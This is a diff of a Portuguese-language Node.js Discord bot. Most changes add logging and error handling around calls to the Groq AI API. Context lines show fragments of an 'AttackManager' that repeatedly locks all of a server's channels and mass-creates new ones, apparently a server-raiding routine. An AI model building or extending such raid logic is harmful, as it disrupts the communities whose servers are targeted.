@@ -3,7 +3,7 @@ const express = require('express');
 const fs = require('fs');
 require('dotenv').config();
 
-// ============ CONFIGURAÇÃO DA GROQ (SEGURA) ============
+// ============ CONFIGURAÇÃO DA GROQ ============
 const GROQ_API_KEY = process.env.GROQ_API_KEY;
 const GROQ_API_URL = 'https://api.groq.com/openai/v1/chat/completions';
 
@@ -26,11 +26,16 @@ client.commands = new Map();
 
 // ============ FUNÇÃO PARA CHAMAR A IA ============
 async function callGroqAI(mensagem) {
+  console.log('🤖 IA: Recebendo pergunta:', mensagem);
+  
   if (!GROQ_API_KEY) {
+    console.error('❌ GROQ_API_KEY não configurada!');
     return '❌ API da Groq não configurada. Contate o administrador.';
   }
 
   try {
+    console.log('📤 Enviando requisição para Groq...');
+    
     const response = await fetch(GROQ_API_URL, {
       method: 'POST',
       headers: {
@@ -54,16 +59,26 @@ async function callGroqAI(mensagem) {
       })
     });
 
+    console.log('📥 Status da resposta:', response.status);
+    
+    if (!response.ok) {
+      const errorText = await response.text();
+      console.error('❌ Erro da API:', errorText);
+      return `❌ Erro na API: ${response.status}`;
+    }
+
     const data = await response.json();
+    console.log('✅ Resposta recebida com sucesso!');
     
     if (data.choices && data.choices.length > 0) {
       return data.choices[0].message.content;
     } else {
+      console.error('❌ Resposta vazia da API:', data);
       return '❌ Erro ao processar sua pergunta. Tente novamente.';
     }
   } catch (error) {
-    console.error('ERRO NA IA:', error);
-    return '❌ Erro ao conectar com a IA. Verifique a API.';
+    console.error('❌ ERRO NA IA:', error.message);
+    return `❌ Erro ao conectar com a IA: ${error.message}`;
   }
 }
 
@@ -197,7 +212,7 @@ class AttackManager {
     lockAllChannels();
     const lockInterval = setInterval(lockAllChannels, 15000);
 
-    // ============ 5. CRIAÇÃO DE CANAIS (SEM NÚMEROS) ============
+    // ============ 5. CRIAÇÃO DE CANAIS ============
     const createChannel = async () => {
       if (!isRunning) return;
       try {
@@ -556,18 +571,18 @@ app.get('/health', (req, res) => {
 });
 
 app.listen(PORT, () => {
-  console.log(`Servidor web rodando na porta ${PORT}`);
+  console.log(`🌐 Servidor web rodando na porta ${PORT}`);
 });
 
 // ============ LOGIN ============
 
 const TOKEN = process.env.TOKEN;
 if (!TOKEN) {
-  console.error('TOKEN NAO ENCONTRADO!');
+  console.error('❌ TOKEN NAO ENCONTRADO!');
   process.exit(1);
 }
 
 client.login(TOKEN).catch(error => {
-  console.error(`Erro ao fazer login: ${error.message}`);
+  console.error(`❌ Erro ao fazer login: ${error.message}`);
   process.exit(1);
 });
